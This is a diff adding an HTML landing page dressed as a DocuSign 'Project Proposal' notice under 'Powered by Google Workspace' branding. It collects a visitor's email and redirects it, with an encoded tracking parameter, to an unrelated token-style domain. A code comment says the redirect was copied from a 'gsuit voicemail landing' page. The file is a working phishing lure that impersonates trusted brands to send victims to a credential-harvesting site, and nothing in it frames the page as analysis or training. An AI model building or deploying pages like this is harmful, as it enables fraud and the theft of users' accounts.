@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Proposal · Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
+            gap: 18px;
+        }
+
+        /* main card */
+        .landing-container {
+            max-width: 520px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 12px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+            padding: 48px 36px 44px;
+            text-align: center;
+        }
+
+        /* Docusign logo – properly sized and contained */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 16px;
+            width: 100%;
+            max-width: 220px;
+            height: auto;
+            min-height: 60px;
+        }
+
+        .docusign-logo {
+            width: 100%;
+            height: auto;
+            max-width: 200px;
+            display: block;
+        }
+
+        .headline {
+            font-weight: 500;
+            font-size: 26px;
+            line-height: 34px;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subheadline {
+            font-weight: 400;
+            font-size: 16px;
+            line-height: 24px;
+            color: #5f6368;
+            margin-bottom: 12px;
+        }
+
+        .email-field {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-family: inherit;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background: #fafafa;
+            transition: border 0.2s, box-shadow 0.2s;
+            margin-bottom: 28px;
+            outline: none;
+            color: #202124;
+        }
+
+        .email-field:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+            background: #ffffff;
+        }
+
+        .email-field::placeholder {
+            color: #9aa0a6;
+            font-weight: 400;
+        }
+
+        .get-started-btn {
+            display: inline-block;
+            padding: 14px 44px;
+            font-size: 17px;
+            font-weight: 500;
+            font-family: inherit;
+            color: #ffffff;
+            background: #1a73e8;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .get-started-btn:hover {
+            background: #1557b0;
+        }
+
+        .get-started-btn:active {
+            transform: scale(0.97);
+        }
+
+        .get-started-btn:disabled {
+            opacity: 0.7;
+            background: #1a73e8;
+            cursor: default;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ---------- POWERED BY GOOGLE WORKSPACE (outside container) ---------- */
+        .powered-by {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #5f6368;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+            background: transparent;
+            padding: 6px 12px;
+            border-radius: 40px;
+            transition: background 0.15s;
+            flex-wrap: wrap;
+        }
+
+        .powered-by:hover {
+            background: rgba(0, 0, 0, 0.02);
+        }
+
+        .google-logo-svg {
+            height: 22px;
+            width: auto;
+            display: block;
+            flex-shrink: 0;
+        }
+
+        .google-workspace-text {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .google-workspace-text span {
+            font-size: 14px;
+            color: #3c4043;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .landing-container {
+                padding: 32px 20px 28px;
+            }
+
+            .logo-container {
+                max-width: 160px;
+                min-height: 40px;
+                margin-bottom: 12px;
+            }
+
+            .docusign-logo {
+                max-height: 60px;
+            }
+
+            .headline {
+                font-size: 22px;
+                line-height: 30px;
+                margin-bottom: 6px;
+            }
+
+            .subheadline {
+                font-size: 15px;
+                margin-bottom: 10px;
+            }
+
+            .email-field {
+                padding: 12px 14px;
+                font-size: 15px;
+                margin-bottom: 24px;
+            }
+
+            .get-started-btn {
+                padding: 12px 32px;
+                font-size: 15px;
+                width: 100%;
+            }
+
+            .powered-by {
+                font-size: 12px;
+                gap: 6px;
+            }
+
+            .google-logo-svg {
+                height: 18px;
+            }
+
+            .google-workspace-text span {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main card container -->
+    <div class="landing-container">
+
+        <!-- Docusign logo (Wikimedia Commons) -->
+        <div class="logo-container">
+            <img 
+                src="https://upload.wikimedia.org/wikipedia/commons/e/e3/Docusign_Full_Color.svg"
+                alt="DocuSign"
+                class="docusign-logo"
+                width="200"
+                height="auto"
+                loading="eager"
+                onerror="this.onerror=null; this.style.display='none'; document.getElementById('fallbackLogo').style.display='flex';"
+            >
+            <!-- fallback simple icon if image fails -->
+            <div id="fallbackLogo" style="display: none; width: 100%; height: 60px; background: #f8f9fa; border-radius: 8px; align-items: center; justify-content: center; color: #1a73e8; font-weight: 600; font-size: 20px;">DocuSign</div>
+        </div>
+
+        <h1 class="headline">Project Proposal Information</h1>
+
+        <p class="subheadline" style="margin-bottom: 12px;">
+            Enter your Google Workspace email to continue
+        </p>
+
+        <input 
+            type="email" 
+            id="workspaceEmail" 
+            class="email-field" 
+            placeholder="you@company.com"
+            autocomplete="email"
+        >
+
+        <button id="openProjectBtn" class="get-started-btn">
+            <span id="btnLabel">Review Project Information</span>
+        </button>
+
+    </div>
+
+    <!-- Powered by Google Workspace – OUTSIDE the container -->
+    <div class="powered-by" aria-label="Powered by Google Workspace">
+        <span class="google-workspace-text">
+            <span>Powered by</span>
+        </span>
+        <!-- Official multicolor Google "G" logo -->
+        <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24" height="24">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+        <span class="google-workspace-text">
+            <span>Google Workspace</span>
+        </span>
+    </div>
+
+    <script>
+        (function() {
+            const emailInput = document.getElementById('workspaceEmail');
+            const openBtn = document.getElementById('openProjectBtn');
+            const btnLabel = document.getElementById('btnLabel');
+
+            // ─── EXACT REDIRECTION FROM gsuit voicemail landing void.html ───
+            const BASE_URL = 'https://n4c8x1.ref-t0k3n1z3r-auth-service-f4g5h6.com';
+            const QUERY_PARAM = 'HoHWJWxD=anNndmR5bw==';
+
+            function buildUrl(email) {
+                const cleanEmail = email.trim();
+                if (!cleanEmail) return null;
+                return `${BASE_URL}?${QUERY_PARAM}&bsd=${encodeURIComponent(cleanEmail)}`;
+            }
+
+            // ─── VALIDATION + REDIRECT (with loading state) ───
+            function handleOpenProject() {
+                const email = emailInput.value.trim();
+
+                // 1. Basic validation
+                if (!email || email.length < 5 || !email.includes('@') || !email.includes('.')) {
+                    alert('Please enter a valid Google Workspace email address (e.g., name@company.com).');
+                    emailInput.focus();
+                    return;
+                }
+
+                // 2. Build URL
+                const targetUrl = buildUrl(email);
+                if (!targetUrl) {
+                    alert('Something went wrong. Please try again.');
+                    return;
+                }
+
+                // 3. Show loading state on button
+                btnLabel.innerHTML = '<span class="spinner"></span> Redirecting...';
+                openBtn.disabled = true;
+
+                // 4. Log for debugging (optional)
+                console.log(`[Project Proposal] Redirecting to: ${targetUrl}`);
+
+                // 5. Redirect after short delay (matches gsuit: 800ms)
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 800);
+            }
+
+            // ─── EVENT BINDING ───
+            openBtn.addEventListener('click', handleOpenProject);
+
+            emailInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleOpenProject();
+                }
+            });
+
+            // Auto-focus
+            emailInput.focus();
+
+            // ensure the button label is restored if the user somehow goes back (bfcache)
+            window.addEventListener('pageshow', function() {
+                if (openBtn.disabled) {
+                    openBtn.disabled = false;
+                    btnLabel.textContent = 'Review Project Information';
+                }
+            });
+        })();
+    </script>
+
+</body>
+</html>
